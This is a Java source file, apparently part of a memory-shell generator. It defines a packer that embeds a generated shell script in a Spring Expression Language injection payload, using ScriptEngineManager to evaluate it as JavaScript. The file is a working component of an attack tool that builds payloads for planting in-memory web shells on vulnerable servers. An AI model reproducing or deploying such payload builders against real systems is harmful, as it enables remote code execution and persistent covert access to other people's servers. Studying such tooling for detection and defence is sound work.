package com.reajason.javaweb.memshell.packer.spel;

import com.reajason.javaweb.memshell.config.GenerateResult;
import com.reajason.javaweb.memshell.packer.Packer;
import com.reajason.javaweb.memshell.packer.Packers;

/**
 * @author ReaJason
 * @since 2024/12/13
 */
public class SpELScriptEnginePacker implements Packer {
    String template = "T(javax.script.ScriptEngineManager).newInstance().getEngineByName('js').eval('{{script}}')";

    @Override
    public String pack(GenerateResult generateResult) {
        String script = Packers.ScriptEngine.getInstance().pack(generateResult);
        return template.replace("{{script}}", script);
    }
}
